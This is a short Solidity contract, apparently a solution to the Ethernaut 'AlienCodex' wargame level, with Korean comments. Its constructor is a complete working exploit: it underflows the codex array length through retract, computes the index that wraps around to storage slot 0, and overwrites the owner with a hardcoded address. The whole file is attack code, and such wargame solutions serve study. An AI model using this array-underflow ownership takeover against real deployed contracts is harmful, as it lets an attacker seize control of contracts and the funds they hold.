// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface AlienCodex {
    function contact() external view returns (bool);
    function codex() external view returns (bytes32[] calldata);
    function owner() external view returns (address);
    function makeContact() external;
    function record(bytes32 _content) external;
    function retract() external;
    function revise(uint256 i, bytes32 _content) external;
}

contract exploit {
    AlienCodex target = AlienCodex(0x4CCe83f831F0d9671d33FAa54F4bE79c2AD2B1EB);
    event logging(address log);

    constructor() {
        target.makeContact();
        target.retract(); // 2**256 까지 storage slot 이 존재함 
        // codex배열: keccak256(abi.encode(1)) 에 위치함
        // type(uint256).max - codex + 1ㅊㅁ
        uint256 tmp = type(uint256).max - uint256(keccak256(abi.encode(1))) + 1;
        target.revise(tmp, bytes32(uint256(uint160(address(0xE9c6Bb1b3dA49415A788D005b9a4fef9f5f19eA3)))));
        emit logging(target.owner());
    }
}
